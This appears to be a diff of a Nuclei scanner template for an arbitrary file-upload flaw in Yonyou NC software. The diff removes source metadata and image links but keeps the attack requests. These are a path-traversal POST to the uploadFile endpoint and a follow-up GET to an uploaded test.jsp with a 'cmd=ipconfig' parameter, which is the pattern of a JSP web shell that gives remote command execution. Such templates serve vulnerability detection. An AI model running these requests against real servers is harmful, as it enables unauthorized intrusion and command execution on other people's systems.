@@ -3,12 +3,8 @@ info:
   name: 用友 NC uploadFile 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ca303gom8lhmbqfa'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ca303gom8lhmbqfa
-    fofa: icon_hash="1085941792"
 http:
 - raw:
   - 'POST /mp/initcfg/../uploadControl/uploadFile HTTP/1.1
@@ -16,7 +12,6 @@ http:
     Host: {{Hostname}}
 
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
-
 
 
     ------WebKitFormBoundaryHHaZAYecVOf5sfa6
@@ -38,7 +33,6 @@ http:
     ------WebKitFormBoundaryHHaZAYecVOf5sfa6--
 
 
-
     上传位置'
   redirects: false
   matchers:
@@ -48,13 +42,7 @@ http:
 - raw:
   - 'GET /mp/uploadFileDir/test.jsp?cmd=ipconfig HTTP/1.1
 
-    Host: {{Hostname}}
-
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413587020-50e11dcb-7d60-49ea-a281-e800fcbb4da3.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413587282-bacc6640-dee4-44f3-9f0c-03a536b6d26a.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
